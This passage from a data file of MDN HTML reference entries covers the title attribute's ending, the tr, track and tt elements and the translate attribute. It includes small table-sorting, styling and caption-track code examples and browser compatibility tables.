updated \\| The Paciello Group](https://www.tpgi.com/using-the-html-title-attribute-updated/)\n- [Tooltips & Toggletips - Inclusive Components](https://inclusive-components.design/tooltips-toggletips/)\n- [The Trials and Tribulations of the Title Attribute - 24 Accessibility](https://www.24a11y.com/2017/the-trials-and-tribulations-of-the-title-attribute/)\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                     | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                     | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `title`             | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `multi-line_titles` | ≤64     | 12   | ≤58     | 51    | ≤11    | 64             | 58                  | 47            | ≤11           | 9.0              | 64              |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n- [`HTMLElement.title`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/title) that reflects this attribute.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/title](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/title)"
- name: tr
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<tr\\>: The Table Row element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftr&level=high)\n\nThe `<tr>` [HTML](../index) element defines a row of cells in a table. The row's cells can then be established using a mix of [`<td>`](td) (data cell) and [`<th>`](th) (header cell) elements.\n\n## Try it\n\n#### HTML Demo: \\<tr\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Alien football stars\n      </caption>\n      <tr>\n        <th scope=\"col\">Player</th>\n        <th scope=\"col\">Gloobles</th>\n        <th scope=\"col\">Za'taak</th>\n      </tr>\n      <tr>\n        <th scope=\"row\">TR-7</th>\n        <td>7</td>\n        <td>4,569</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Khiresh Odo</th>\n        <td>7</td>\n        <td>7,223</td>\n      </tr>\n      <tr>\n        <th scope=\"row\">Mia Oolong</th>\n        <td>9</td>\n        <td>6,219</td>\n      </tr>\n    </table>\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 10px;\n    }\n\n    th[scope='col'] {\n      background-color: #505050;\n      color: #fff;\n    }\n\n    th[scope='row'] {\n      background-color: #d6ecd4;\n    }\n\n    td {\n      text-align: center;\n    }\n\n    tr:nth-of-type(even) {\n      background-color: #eee;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of each row cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and on offset defined by the [`charoff`](#charoff) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property instead, as this attribute is deprecated.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of each row cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nSpecifies the alignment of the content to a character of each row cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored.\n\n[`charoff`](#charoff) Deprecated  \nSpecifies the number of characters to offset the row cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of each row cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<tr>` element is valid as a child of a [`<thead>`](thead), [`<tbody>`](tbody), or [`<tfoot>`](tfoot) element only.\n- If the `<tr>` is placed as a direct child of its parent [`<table>`](table) element, the `<tbody>` parent is implied and browsers will add the `<tbody>` to the markup.\n- The implied `<tbody>` parent is only supported if the `<table>` otherwise has no child `<tbody>` elements, and only if the `<tr>` is included after any [`<caption>`](caption), [`<colgroup>`](colgroup), and `<thead>` elements.\n- The CSS pseudo-classes [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type), [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type), and [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type) are often useful for selecting the desired set of rows and their data and header cells ([`<td>`](td) and [`<th>`](th) elements).\n- When a `<tr>` is included as a direct child of the `<table>`, as the browser adds a `<tbody>` to the markup, CSS selectors such as `table > tr` may not work as expected or at all.\n\n## Examples\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\n### Basic row setup\n\nThis example demonstrates a table with four rows and three columns, where the first column contains headers for the row data cells.\n\n#### HTML\n\nFour `<tr>` elements are used to create four table rows. Each row contains three cells - one header cell ([`<th>`](th)) and two data cells ([`<td>`](td)) - creating three columns. The [`scope`](th#scope) attribute set on each header cell specifies which cells they relate to, which in this example is all data cells within the `row`.\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>AL fah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td>DELL tah</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nThe CSS [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type) pseudo-class is used to select every `odd` row and set the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) of those rows to a slightly darker tone, creating a so-called \"zebra stripe\" effect. This alternating background makes the rows of data in the table easier to parse and read—imagine having many rows and columns and trying to find some data in a particular row. In addition, the row header cells ([`<th>`](th) elements) are highlighted with a [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) to distinguish them from the data cells ([`<td>`](td) elements).\n\ncss\n\n```\ntr:nth-of-type(odd) {\n  background-color: #eee;\n}\n\ntr th[scope=\"row\"] {\n  background-color: #d6ecd4;\n}\n```\n\n#### Result\n\n### Header row\n\nThis example extends the basic table from the [previous example](#basic_row_setup) by adding a header row as the first row of the table.\n\n#### HTML\n\nAn additional table row (`<tr>`) is added as the first row of the table with column header cells ([`<th>`](th)) providing a header for each column. We put this row in a [`<thead>`](thead) grouping element to indicate this is the header of the table. The [`scope`](th#scope) attribute is added to each header cell (`<th>`) within this head row to explicitly specify that each header cell relates to all the cells within its own column, even though those cells are in the [`<tbody>`](tbody).\n\nhtml\n\n```\n<table>\n  <tr>\n    <th scope=\"col\">Symbol</th>\n    <th scope=\"col\">Code word</th>\n    <th scope=\"col\">Pronunciation</th>\n  </tr>\n  <tr>\n    <th scope=\"row\">A</th>\n    <td>Alfa</td>\n    <td>AL fah</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">B</th>\n    <td>Bravo</td>\n    <td>BRAH voh</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">C</th>\n    <td>Charlie</td>\n    <td>CHAR lee</td>\n  </tr>\n  <tr>\n    <th scope=\"row\">D</th>\n    <td>Delta</td>\n    <td>DELL tah</td>\n  </tr>\n</table>\n```\n\n#### CSS\n\nThe CSS is nearly unchanged from the [previous example](#basic_row_setup), except for some additional styling to highlight the \"header row\" so that the headers of the columns stand out from the other cells.\n\ncss\n\n```\ntr:nth-of-type(odd) {\n  background-color: #eee;\n}\n\ntr th[scope=\"col\"] {\n  background-color: #505050;\n  color: #fff;\n}\n\ntr th[scope=\"row\"] {\n  background-color: #d6ecd4;\n}\n```\n\n#### Result\n\n### Sorting rows\n\nThere are no native methods for sorting the rows (`<tr>` elements) of a [`<table>`](table). But using [`Array.prototype.sort()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort), [`Node.removeChild`](https://developer.mozilla.org/en-US/docs/Web/API/Node/removeChild), and [`Node.appendChild`](https://developer.mozilla.org/en-US/docs/Web/API/Node/appendChild), a custom `sort()` function can be implemented in JavaScript to sort an [`HTMLCollection`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) of `<tr>` elements.\n\n#### HTML\n\nA [`<tbody>`](tbody) element is used in this basic table to mark the body section of the table and to include three rows (`<tr>` elements) with data ([`<td>`](td) elements), creating one column with numbers in descending order.\n\nhtml\n\n```\n<table>\n  <tbody>\n    <tr>\n      <td>3</td>\n    </tr>\n    <tr>\n      <td>2</td>\n    </tr>\n    <tr>\n      <td>1</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### JavaScript\n\nIn the JavaScript code below, the created `sort()` function is attached to the [`<tbody>`](tbody) element so that it sorts the table cells in order of increasing value and updates the display accordingly.\n\njs\n\n```\nHTMLTableSectionElement.prototype.sort = function (cb) {\n  Array.from(this.rows)\n    .sort(cb)\n    .forEach((e) => this.appendChild(this.removeChild(e)));\n};\n\ndocument\n  .querySelector(\"table\")\n  .tBodies[0].sort((a, b) => a.textContent.localeCompare(b.textContent));\n```\n\n#### Result\n\n### Sorting rows with a click on header cells\n\nThis example extends the basic table from the [previous example](#sorting_rows) by making the sorting interactive and independent for multiple columns.\n\n#### HTML\n\nAn additional data cell ([`<td>`](td) element) is added to each row (`<tr>` element) within the table body ([`<tbody>`](tbody) element) to create a second column with letters in ascending order. Using the [`<thead>`](thead) element, a head section is added before the body section to introduce a head row with table header cells ([`<th>`](th) element). These header cells are used in the JavaScript code below to make them clickable and then to perform the corresponding sorting when activated per click.\n\nhtml\n\n```\n<table>\n  <thead>\n    <tr>\n      <th>Numbers</th>\n      <th>Letters</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>3</td>\n      <td>A</td>\n    </tr>\n    <tr>\n      <td>2</td>\n      <td>B</td>\n    </tr>\n    <tr>\n      <td>1</td>\n      <td>C</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n#### JavaScript\n\nA click event handler is added to each table header ([`<th>`](th) element) of each [`<table>`](table) in the [`document`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDocument); it sorts all the rows (`<tr>` elements) of the [`<tbody>`](tbody) based on the contents of the data cells ([`<td>`](td) elements) contained in the rows.\n\n**Note:** This solution assumes that the [`<td>`](td) elements are populated by raw text with no descendant elements.\n\njs\n\n```\nconst allTables = document.querySelectorAll(\"table\");\n\nfor (const table of allTables) {\n  const tBody = table.tBodies[0];\n  const rows = Array.from(tBody.rows);\n  const headerCells = table.tHead.rows[0].cells;\n\n  for (const th of headerCells) {\n    const cellIndex = th.cellIndex;\n\n    th.addEventListener(\"click\", () => {\n      rows.sort((tr1, tr2) => {\n        const tr1Text = tr1.cells[cellIndex].textContent;\n        const tr2Text = tr2.cells[cellIndex].textContent;\n        return tr1Text.localeCompare(tr2Text);\n      });\n\n      tBody.append(...rows);\n    });\n  }\n}\n```\n\n#### Result\n\n**Note:** To be usable and accessible, the header cell of each sortable column must be identifiable as a sorting button and each must define whether the column is currently sorted in ascending or descending order visually and with the [`aria-sort`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-sort) attribute. See the [ARIA Authoring Practices Guide](https://www.w3.org/WAI/ARIA/apg/)'s [sortable table example](https://www.w3.org/WAI/ARIA/apg/patterns/table/examples/sortable-table/) for more information.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                       |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None                                                                                                                                                                                                                                                                                                  |\n| Permitted content                           | Zero or more [`<td>`](td) and/or [`<th>`](th) elements; [script-supporting elements](https://developer.mozilla.org/en-US/docs/Glossary/Script-supporting_element) ([`<script>`](script) and [`<template>`](template)) are also allowed.                                                               |\n| Tag omission                                | Start tag is mandatory. End tag may be omitted if the `<tr>` element is immediately followed by a `<tr>` element, or if the row is the last element in its parent table group ([`<thead>`](thead), [`<tbody>`](tbody) or [`<tfoot>`](tfoot)) element.                                                 |\n| Permitted parents                           | [`<table>`](table) (only if the table has no child [`<tbody>`](tbody) element, and even then only after any [`<caption>`](caption), [`<colgroup>`](colgroup), and [`<thead>`](thead) elements); otherwise, the parent must be a [`<thead>`](thead), [`<tbody>`](tbody) or [`<tfoot>`](tfoot) element. |\n| Implicit ARIA role                          | [`row`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/row_role)                                                                                                                                                                                                               |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                                                                   |\n| DOM interface                               | [`HTMLTableRowElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTableRowElement)                                                                                                                                                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `tr`      | 1       | 12   | 1       | ≤12.1 | 1      | 18             | 4                   | ≤12.1         | 1             | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `bgcolor` | 1       | 12   | 1       | ≤15   | 1      | 18             | 4                   | ≤14           | 1             | 1.0              | 4.4             |     |\n| `char`    | 1       | 12   | No      | 15    | ≤4     | 18             | No                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `charoff` | 1       | 12   | No      | 15    | ≤4     | 18             | No                  | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `valign`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each row cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of row cells\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each row cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each row cell content\n- [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type), [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type), [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type): CSS pseudo-classes to select the desired row cells\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tr](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/tr)"
- name: track
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<track\\>: The Embed Text Track element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Ftrack&level=high)\n\nThe `<track>` [HTML](../index) element is used as a child of the media elements, [`<audio>`](audio) and [`<video>`](video). Each track element lets you specify a timed text track (or time-based data) that can be displayed in parallel with the media element, for example to overlay subtitles or closed captions on top of a video or alongside audio tracks.\n\nMultiple tracks can be specified for a media element, containing different kinds of timed text data, or timed text data that has been translated for different locales. The data that is used will either be the track that has been set to be the default, or a kind and translation based on user preferences.\n\nThe tracks are formatted in [WebVTT format](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API) (`.vtt` files) — Web Video Text Tracks.\n\n## Try it\n\n#### HTML Demo: \\<track\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <video controls src=\"/media/cc0-videos/friday.mp4\">\n      <track default kind=\"captions\" srclang=\"en\" src=\"/media/examples/friday.vtt\" />\n      Download the\n      <a href=\"/media/cc0-videos/friday.mp4\">MP4</a>\n      video, and\n      <a href=\"/media/examples/friday.vtt\">subtitles</a>.\n    </video>\n\n    video {\n      width: 250px;\n    }\n\n    video::cue {\n      font-size: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`default`](#default)  \nThis attribute indicates that the track should be enabled unless the user's preferences indicate that another track is more appropriate. This may only be used on one `track` element per media element.\n\n[`kind`](#kind)  \nHow the text track is meant to be used. If omitted the default kind is `subtitles`. If the attribute contains an invalid value, it will use `metadata`. The following keywords are allowed:\n\n- `subtitles`\n  - Subtitles provide translation of content that cannot be understood by the viewer. For example speech or text that is not English in an English language film.\n  - Subtitles may contain additional content, usually extra background information. For example the text at the beginning of the Star Wars films, or the date, time, and location of a scene.\n- `captions`\n  - Closed captions provide a transcription and possibly a translation of audio.\n  - It may include important non-verbal information such as music cues or sound effects. It may indicate the cue's source (e.g. music, text, character).\n  - Suitable for users who are deaf or when the sound is muted.\n- `chapters`\n  - Chapter titles are intended to be used when the user is navigating the media resource.\n- `metadata`\n  - Tracks used by scripts. Not visible to the user.\n\n[`label`](#label)  \nA user-readable title of the text track which is used by the browser when listing available text tracks.\n\n[`src`](#src)  \nAddress of the track (`.vtt` file). Must be a valid URL. This attribute must be specified and its URL value must have the same origin as the document — unless the [`<audio>`](audio) or [`<video>`](video) parent element of the `track` element has a [`crossorigin`](../attributes/crossorigin) attribute.\n\n[`srclang`](#srclang)  \nLanguage of the track text data. It must be a valid [BCP 47](https://r12a.github.io/app-subtags/) language tag. If the `kind` attribute is set to `subtitles`, then `srclang` must be defined.\n\n## Usage notes\n\n### Track data types\n\nThe type of data that `track` adds to the media is set in the `kind` attribute, which can take values of `subtitles`, `captions`, `chapters` or `metadata`. The element points to a source file containing timed text that the browser exposes when the user requests additional data.\n\nA media element cannot have more than one `track` with the same `kind`, `srclang`, and `label`.\n\n### Detecting cue changes\n\nThe underlying [`TextTrack`](https://developer.mozilla.org/en-US/docs/Web/API/TextTrack), indicated by the `track` property, receives a `cuechange` event every time the currently-presented cue is changed. This happens even if the track isn't associated with a media element.\n\nIf the track *is* associated with a media element, using the `<track>` element as a child of the [`<audio>`](audio) or [`<video>`](video) element, the `cuechange` event is also sent to the [`HTMLTrackElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTrackElement).\n\njs\n\n```\nlet textTrackElem = document.getElementById(\"texttrack\");\n\ntextTrackElem.addEventListener(\"cuechange\", (event) => {\n  let cues = event.target.track.activeCues;\n});\n```\n\n### Adding text tracks programmatically\n\nThe JavaScript interface that represents the `<track>` element is [`HTMLTrackElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTrackElement). The text track associated with an element can be obtained from the `HTMLTrackElement.track` property, and is of type [`TextTrack`](https://developer.mozilla.org/en-US/docs/Web/API/TextTrack).\n\n`TextTrack` objects also can be added to a [`HTMLVideoElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) or [`HTMLAudioElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAudioElement) elements using the `HTMLMediaElement.addTextTrack()` method. The `TextTrack` objects associated with a media element stored in a [`TextTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/TextTrackList), which can be retrieved using the [`HTMLMediaElement.textTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/textTracks) property.\n\n## Examples\n\nhtml\n\n```\n<video controls poster=\"/images/sample.gif\">\n  <source src=\"sample.mp4\" type=\"video/mp4\" />\n  <source src=\"sample.ogv\" type=\"video/ogv\" />\n  <track kind=\"captions\" src=\"sampleCaptions.vtt\" srclang=\"en\" />\n  <track kind=\"chapters\" src=\"sampleChapters.vtt\" srclang=\"en\" />\n  <track kind=\"subtitles\" src=\"sampleSubtitles_de.vtt\" srclang=\"de\" />\n  <track kind=\"subtitles\" src=\"sampleSubtitles_en.vtt\" srclang=\"en\" />\n  <track kind=\"subtitles\" src=\"sampleSubtitles_ja.vtt\" srclang=\"ja\" />\n  <track kind=\"subtitles\" src=\"sampleSubtitles_oz.vtt\" srclang=\"oz\" />\n  <track kind=\"metadata\" src=\"keyStage1.vtt\" srclang=\"en\" label=\"Key Stage 1\" />\n  <track kind=\"metadata\" src=\"keyStage2.vtt\" srclang=\"en\" label=\"Key Stage 2\" />\n  <track kind=\"metadata\" src=\"keyStage3.vtt\" srclang=\"en\" label=\"Key Stage 3\" />\n  <!-- Fallback -->\n  …\n</video>\n```\n\n## Technical summary\n\n|                                             |                                                                                               |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None                                                                                          |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element). |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                           |\n| Permitted parents                           | A media element, [`<audio>`](audio) or [`<video>`](video).                                    |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)           |\n| Permitted ARIA roles                        | No `role` permitted                                                                           |\n| DOM interface                               | [`HTMLTrackElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTrackElement)       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [WebVTT text track format](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API)\n- [`HTMLMediaElement.textTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/textTracks)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track)"
- name: translate (attribute)
  summary: Since March 2023, this feature works across the latest devices and browser versions
  description: "# translate\n\n## Baseline 2023\n\nNewly available\n\nSince March 2023, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FGlobal_attributes%2Ftranslate&level=low)\n\nThe `translate` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute that is used to specify whether an element's *translatable attribute* values and its [`Text`](https://developer.mozilla.org/en-US/docs/Web/API/Text) node children should be translated when the page is localized, or whether to leave them unchanged.\n\nIt can have the following values:\n\n- empty string or `yes`, which indicates that the element should be translated when the page is localized.\n- `no`, which indicates that the element must not be translated.\n\nAlthough not all browsers recognize this attribute, it is respected by automatic translation systems such as Google Translate, and may also be respected by tools used by human translators. As such it's important that web authors use this attribute to mark content that should not be translated.\n\n## Examples\n\nIn this example, the `translate` attribute is used to ask translation tools not to translate the company's brand name in the footer.\n\nhtml\n\n```\n<footer>\n  <small>© 2020 <span translate=\"no\">BrandName</span></small>\n</footer>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `translate` | 19      | 79   | 111     | 15    | 6      | 25             | 111                 | 14            | 6             | 1.5              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n- The [`HTMLElement.translate`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/translate) property that reflects this attribute.\n- [Using HTML's translate attribute](https://www.w3.org/International/questions/qa-translate-flag).\n- HTML [`lang`](../global_attributes#lang) attribute\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/translate](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/translate)"
- name: tt
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<tt\\>: The Teletype Text element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<tt>` [HTML](../index) element creates inline text which is presented using the [user agent's](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) default monospace font face. This element was created for the purpose of rendering text as it would be displayed on a fixed-width display such as a teletype, text-only screen, or line printer.\n\nThe terms **non-proportional**, **monotype**, and **monospace** are used interchangeably and have the same general meaning: they describe a typeface whose characters are all the same number of pixels wide.\n\nThis element is obsolete, however. You should use the more semantically helpful [`<code>`](code), [`<kbd>`](kbd), [`<samp>`](samp), or [`<var>`](var) elements for inline text that needs to be presented in monospace type, or the [`<pre>`](pre) tag for content that should be presented as a separate block.\n\n**Note:** If none of the semantic elements are appropriate for your use case (for example, if you need to show some content in a non-proportional font), you should consider using the [`<span>`](span) element, styling it as desired using CSS. The [`font-family`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-family) property is a good place to start.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes)\n\n## Examples\n\n### Basic example\n\nThis example uses `<tt>` to show text entered into, and output by, a terminal application.\n\nhtml\n\n```\n<p>\n  Enter the following at the telnet command prompt:\n  <code>set localecho</code><br />\n\n  The telnet client should display: <tt>Local Echo is on</tt>\n</p>\n```\n\n#### Result\n\n### Overriding the default font\n\nYou can override the browser's default font—if the browser permits you to do so, which it isn't required to do—using CSS:\n\n#### CSS\n\ncss\n\n```\ntt {\n  font-family: \"Lucida Console\", \"Menlo\", \"Monaco\", \"Courier\", monospace;\n}\n```\n\n#### HTML\n\nhtml\n\n```\n<p>\n  Enter the following at the telnet command prompt:\n  <code>set localecho</code><br />\n\n  The telnet client should display: <tt>Local Echo is on</tt>\n</p>\n```\n\n#### Result\n\n## Usage notes\n\nThe `<tt>` element is, by default, rendered using the browser's default non-proportional font. You can override this using CSS by creating a rule using the `tt` selector, as seen in the example [Overriding the default font](#overriding_the_default_font) above.\n\n**Note:** User-configured changes to the default monospace font setting may take precedence over your CSS.\n\nAlthough this element wasn't officially deprecated in HTML 4.01, its use was discouraged in favor of the semantic elements and/or CSS. The `<tt>` element is obsolete in HTML 5.\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The semantic [`<code>`](code), [`<var>`](var), 